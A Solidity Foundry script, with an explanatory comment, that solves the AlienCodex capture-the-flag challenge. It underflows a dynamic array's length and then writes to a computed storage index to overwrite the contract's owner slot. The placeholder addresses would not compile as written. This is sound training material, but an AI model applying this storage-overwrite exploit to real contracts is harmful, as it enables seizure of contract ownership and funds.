// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../lib/forge-std/src/Script.sol";

// Script to perform the AlienCodex attack, exploiting storage layout to overwrite ownership
contract AlienCodexAttack is Script {
    
    // Maximum uint256 value
    uint256 maxValue = type(uint256).max;

    // Start position for the codex array in storage
    uint256 codexStartPosition = uint256(keccak256(abi.encode(1)));

    // Address of the AlienCodex contract (replace with actual instance address)
    address alienCodexContract = 0xYourInstanceAddressHere;

    // Payload for calling the makeContact() function
    bytes makeContactPayload = abi.encodeWithSignature("makeContact()");

    // Payload for retracting the codex (resizing the array)
    bytes retractPayload = abi.encodeWithSignature("retract()");

    // The new owner address to overwrite in storage (replace with actual player's address)
    bytes32 newOwner = 0x000000000000000000000001YourPlayerAddressHere;

    // Calculate the storage index that corresponds to the owner slot (using overflow)
    uint256 ownerStorageIndex = maxValue - codexStartPosition + 1;

    // Payload to revise the codex and overwrite the owner storage slot
    bytes revisePayload = abi.encodeWithSignature("revise(uint256,bytes32)", ownerStorageIndex, newOwner);
    
    function run() external {
        // Start broadcasting with the private key from the .env file
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Call makeContact to ensure the contact is made
        alienCodexContract.call(makeContactPayload);

        // Call retract to shrink the codex array (array underflow)
        alienCodexContract.call(retractPayload);

        // Overwrite the owner variable by revising the codex at the overflowed index
        alienCodexContract.call(revisePayload);

        // Stop broadcasting after the transaction is executed
        vm.stopBroadcast();
    }
}


/*
Explanation of the AlienCodex Attack Script:

1. **Low-level calls**: The AlienCodex contract is written in Solidity ^0.5.0, and to avoid any compatibility issues between Solidity versions, low-level calls (`call()`) are used for function invocations.

2. **Steps of the Attack**:
    - **makeContact()**: The `makeContact` function is called to ensure interaction with the contract.
    - **retract()**: Calling `retract` causes an underflow in the dynamic `codex` array, allowing it to expand to cover nearly all storage slots.
    - **revise()**: Using the array underflow, we calculate the storage index where the `owner` is stored. We then overwrite this slot with our own address by calling `revise`.

3. **Storage Layout Manipulation**:
    - In Solidity, the first slot of the array (`codex`) is used to store the length, and after causing an underflow, the array will span all storage slots.
    - The `owner` variable is stored in one of these storage slots, and by calculating the right slot, we can overwrite it.

4. **Address Calculation**:
    - `maxValue - codexStartPosition + 1` is used to determine the correct storage index for the owner variable after the underflow occurs.

5. **Key Concept**: This challenge demonstrates how manipulating storage through underflows in arrays can grant control over critical contract variables like `owner`, illustrating the importance of correctly managing dynamic arrays in Solidity.
*/